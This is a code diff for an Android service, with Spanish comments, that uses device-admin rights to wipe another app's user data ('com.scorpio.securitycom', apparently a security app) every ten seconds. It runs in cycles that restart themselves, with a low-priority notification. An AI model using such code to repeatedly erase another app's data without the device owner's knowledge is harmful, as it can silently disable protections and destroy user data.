@@ -10,19 +10,15 @@ import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
-import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
 import android.os.SystemClock;
-import android.provider.Settings;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
-import androidx.core.content.ContextCompat;
 
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
@@ -31,8 +27,10 @@ public class ClearService extends Service {
     private static final String TAG = "ClearService";
     private static final String CHANNEL_ID = "clear_service_channel";
     private static final int NOTIF_ID = 1;
+    private static final int NOTIF_CYCLE_FINISHED_ID = 2;
 
-    private static final long INTERVAL_MS = 2000; // Intervalo de limpieza cada 10 segundos
+    private static final long INTERVAL_MS = 10000; // 10 segundos entre limpiezas
+    private static final int MAX_CLEAN_COUNT = 10; // Limpiezas por ciclo
 
     private Handler handler;
     private Runnable clearTask;
@@ -42,14 +40,19 @@ public class ClearService extends Service {
 
     private static final String TARGET_PACKAGE = "com.scorpio.securitycom";
 
+    private int cleanCount = 0;
     private enum ServiceState { IDLE, RUNNING, STOPPED }
     private ServiceState currentState = ServiceState.IDLE;
+
+    private NotificationManager notificationManager;
 
     @Override
     public void onCreate() {
         super.onCreate();
         Log.i(TAG, "Servicio creado");
+        notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         createNotificationChannel();
+        createCycleFinishedChannel();
         startForegroundServiceWithNotification();
 
         handler = new Handler(Looper.getMainLooper());
@@ -57,37 +60,13 @@ public class ClearService extends Service {
         adminComponent = new ComponentName(this, MyAdminReceiver.class);
         executor = Executors.newSingleThreadExecutor();
 
-        checkAndRequestExactAlarmPermission();
-
         setupClearTask();
-    }
-
-    private void checkAndRequestExactAlarmPermission() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) { // Android 12+
-            if (!canScheduleExactAlarms()) {
-                Log.w(TAG, "Permiso SCHEDULE_EXACT_ALARM no concedido, solicitando al usuario");
-                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
-                intent.setData(Uri.parse("package:" + getPackageName()));
-                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                startActivity(intent);
-            } else {
-                Log.i(TAG, "Permiso SCHEDULE_EXACT_ALARM concedido");
-            }
-        }
-    }
-
-    private boolean canScheduleExactAlarms() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
-            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
-            return alarmManager != null && alarmManager.canScheduleExactAlarms();
-        }
-        return true; // Antes de Android 12 no se requiere permiso explícito
     }
 
     private void startForegroundServiceWithNotification() {
         Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Limpieza activa")
-                .setContentText("El sistema se está limpiando continuamente")
+                .setContentText("Ejecutando ciclo de limpieza automática")
                 .setSmallIcon(R.mipmap.ic_launcher)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setCategory(Notification.CATEGORY_SERVICE)
@@ -101,6 +80,48 @@ public class ClearService extends Service {
         }
     }
 
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    CHANNEL_ID,
+                    "Servicio de Limpieza",
+                    NotificationManager.IMPORTANCE_LOW
+            );
+            channel.setDescription("Notificaciones del servicio de limpieza");
+            if (notificationManager != null) {
+                notificationManager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private void createCycleFinishedChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    "cycle_finished_channel",
+                    "Ciclo de limpieza finalizado",
+                    NotificationManager.IMPORTANCE_DEFAULT
+            );
+            channel.setDescription("Notificaciones cuando el ciclo de limpieza termina");
+            if (notificationManager != null) {
+                notificationManager.createNotificationChannel(channel);
+            }
+        }
+    }
+
+    private void showCycleFinishedNotification() {
+        Notification notification = new NotificationCompat.Builder(this, "cycle_finished_channel")
+                .setContentTitle("Ciclo de limpieza completado")
+                .setContentText("El servicio se reiniciará para comenzar un nuevo ciclo")
+                .setSmallIcon(R.mipmap.ic_launcher)
+                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+                .setAutoCancel(true)
+                .build();
+
+        if (notificationManager != null) {
+            notificationManager.notify(NOTIF_CYCLE_FINISHED_ID, notification);
+        }
+    }
+
     private void setupClearTask() {
         clearTask = new Runnable() {
             @Override
@@ -108,24 +129,45 @@ public class ClearService extends Service {
                 try {
                     if (dpm == null) {
                         Log.w(TAG, "DevicePolicyManager es null");
-                    } else if (!dpm.isAdminActive(adminComponent)) {
+                        stopSelf();
+                        currentState = ServiceState.STOPPED;
+                        return;
+                    }
+                    if (!dpm.isAdminActive(adminComponent)) {
                         Log.w(TAG, "No es administrador de dispositivo, no se puede limpiar");
                         stopSelf();
                         currentState = ServiceState.STOPPED;
                         return;
-                    } else {
-                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
-                            Log.i(TAG, "Intentando limpiar datos de: " + TARGET_PACKAGE);
-                            dpm.clearApplicationUserData(adminComponent, TARGET_PACKAGE, executor,
-                                    (packageName, succeeded) -> Log.i(TAG, "Limpieza: " + packageName + " - " + (succeeded ? "Éxito" : "Falló")));
-                        } else {
-                            Log.w(TAG, "API no soportada para clearApplicationUserData");
-                        }
                     }
+
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
+                        Log.i(TAG, "Limpieza #" + (cleanCount + 1) + " de: " + TARGET_PACKAGE);
+                        dpm.clearApplicationUserData(adminComponent, TARGET_PACKAGE, executor,
+                                (packageName, succeeded) -> Log.i(TAG, "Limpieza: " + packageName + " - " + (succeeded ? "Éxito" : "Falló")));
+                    } else {
+                        Log.w(TAG, "API no soportada para clearApplicationUserData");
+                        stopSelf();
+                        currentState = ServiceState.STOPPED;
+                        return;
+                    }
+
+                    cleanCount++;
+
+                    if (cleanCount >= MAX_CLEAN_COUNT) {
+                        Log.i(TAG, "Ciclo completado. Reiniciando servicio...");
+                        showCycleFinishedNotification();
+                        stopCleanupProcess();
+                        scheduleRestart();
+                        stopSelf();
+                        currentState = ServiceState.STOPPED;
+                    } else {
+                        handler.postDelayed(this, INTERVAL_MS);
+                    }
+
                 } catch (Throwable t) {
                     Log.e(TAG, "Error inesperado en clearTask", t);
-                } finally {
-                    handler.postDelayed(this, INTERVAL_MS);
+                    stopSelf();
+                    currentState = ServiceState.STOPPED;
                 }
             }
         };
@@ -135,6 +177,7 @@ public class ClearService extends Service {
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.i(TAG, "onStartCommand recibido, iniciando limpieza");
         if (currentState != ServiceState.RUNNING) {
+            cleanCount = 0;
             handler.post(clearTask);
             currentState = ServiceState.RUNNING;
         }
@@ -192,24 +235,6 @@ public class ClearService extends Service {
         scheduleRestart();
         currentState = ServiceState.STOPPED;
         super.onDestroy();
-    }
-
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel channel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Servicio de Limpieza",
-                    NotificationManager.IMPORTANCE_MIN
-            );
-            channel.setDescription("Limpieza automática del dispositivo");
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-                Log.i(TAG, "Canal de notificación creado");
-            } else {
-                Log.w(TAG, "NotificationManager es null, no se pudo crear canal");
-            }
-        }
     }
 
     @Override
